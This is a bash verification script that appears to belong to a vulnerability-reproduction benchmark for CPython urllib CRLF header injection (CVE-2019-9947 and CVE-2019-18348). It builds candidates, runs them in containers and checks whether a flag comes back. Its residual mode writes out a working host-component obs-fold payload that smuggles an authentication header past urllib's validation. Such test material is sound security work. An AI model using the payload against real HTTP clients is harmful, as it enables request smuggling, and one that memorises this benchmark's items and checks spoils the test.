#!/usr/bin/env bash
# verify.sh --seed|--residual — cpython-urllib CRLF header injection (CVE-2019-9947 -> CVE-2019-18348)
#   --seed     : PATH CRLF injection (CVE-2019-9947)  -> V0(py3.7.2) 达效果；V1(py3.7.4) 被 _validate_path 拦截
#   --residual : HOST obs-fold injection (CVE-2019-18348, CVE-2019-9947 未覆盖 host 组件)
#                -> V1(py3.7.4) 仍达效果（无 _validate_host）；仅 stretch 旧 glibc 可解析
# flag 通道: sidecar(10.89.0.2:80, 容器内网) 收到被走私的 X-PCB-Auth: PCB-AUTH-7f3a 头才回 ${PCB_FLAG}；
# 动态端口导出（compose 已转 PORT_ 动态端口；seed_exec 的 BASE 由 PCB_TARGET_PORT 覆盖）
CASE_DIR="${CASE_DIR:-$(cd "$(dirname "$0")/.." && pwd)}"
_SVC_ALL="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --services 2>/dev/null | grep -E "(^|-|_)$VERSION$")"
SVC="$(printf '%s\n' "$_SVC_ALL" | grep -vE "db|redis|mongo|mysql|postgres|sidecar|callback" | head -1)"
SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | head -1)}"
_CP="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
_DYN="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" "${_CP:-8080}" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
[[ -n "$_DYN" ]] && export PCB_TARGET_PORT="$_DYN"
export PCB_TARGET_PORT="${PCB_TARGET_PORT:-}"

#            client.py 经 docker compose exec 执行 urlopen，seed_exec.py 输出 JSON 的 'X' 字段 = flag 或 ""。
# 判定基准: RUN_FLAG_REF（回退 RUN_FLAG）。
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
REF="$RUN_FLAG"
mkdir -p "$WORK_DIR"

# candidate 构造
if [[ "$MODE" == "--seed" ]]; then
  "$PY" - "$CASE_DIR/poc" > "$WORK_DIR/cand.json" <<'PYEOF'
import sys, json
sys.path.insert(0, sys.argv[1])
import original_poc
print(json.dumps(original_poc.candidate()))
PYEOF
else
  # residual: HOST 组件 CRLF/obs-fold（CVE-2019-18348 语义，独立实现，不引用 hidden 文件）。
  # Host 头值经 putheader 的 _is_illegal_header_value 检查：\r\n<非空白> 被拒，但 \r\n\t 折叠续行被允许；
  # host 组件本身无 _validate_host 控制字符检查 -> 走私 X-PCB-Auth 头；尾部 \t:80 使 _get_hostport 拿到端口。
  "$PY" - > "$WORK_DIR/cand.json" <<'PYEOF'
import json, sys
print(json.dumps({
    "id": "cve-2019-18348-host-obsfold-tab",
    "url": "http://10.89.0.2\r\n\tX-PCB-Auth: PCB-AUTH-7f3a\r\n\t:80/",
    "component": "host",
}))
PYEOF
fi

# seed_exec.py 的 docker compose exec 不带 -p/--project-directory（cwd=poc 目录），
# 必须经环境变量提供项目上下文；PCB_X 决定它探测/回传的 token，用判定基准 REF（sidecar 回的是真 flag）。
export COMPOSE_PROJECT_NAME COMPOSE_FILE="$CASE_DIR/docker-compose.yml" PCB_X="$REF"
export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"  # poc_common importable
OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
echo "$OUT" | head -c 600; echo

# 判定: 'X' 字段 == 真 flag -> 效果发生；docker/exec 层错误（容器未起、compose 上下文缺失）-> 环境失败；否则未发生。
"$PY" - "$OUT" <<'PYEOF'
import json, os, re, sys
try:
    d = json.loads(sys.argv[1])
except Exception:
    print("verify: bad executor output", file=sys.stderr)
    sys.exit(20)
ref = os.environ.get("RUN_FLAG_REF") or os.environ["RUN_FLAG"]
if d.get("X") == ref:
    sys.exit(0)
out = str(d.get("client_output", ""))
if re.search(r"no such service|no configuration file|error during connect|Cannot connect|not running|pull access denied|image .* not found", out, re.I):
    print("verify: docker/compose error (env):", out[:300], file=sys.stderr)
    sys.exit(20)
print("verify: flag not observed (guard blocked or probe failed)")
sys.exit(10)
PYEOF
